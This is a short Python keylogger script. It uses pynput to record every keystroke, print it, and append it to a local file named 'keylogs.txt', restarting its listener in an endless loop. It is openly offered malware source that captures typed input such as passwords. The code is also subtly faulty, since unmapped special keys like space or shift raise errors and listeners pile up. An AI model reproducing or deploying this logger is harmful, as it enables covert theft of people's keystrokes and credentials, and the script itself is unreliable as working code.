import time

from pynput import keyboard


class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:
        self.filename = filename
        self.spec_keys = {
            "Key.up": "^",
            "Key.down": "v",
            "Key.left": "<",
            "Key.right": ">",
            "Key.enter": "\n",
            "Key.backspace": "Key.backspace",
        }

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            if "Key" in self.get_char(key):
                k = self.spec_keys[self.get_char(key)]
            else:
                k = self.get_char(key)
            logs.write(k)

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()
        time.sleep(2)


if __name__ == '__main__':
    while True:
        logger = KeyLogger()
        logger.main()
        # input()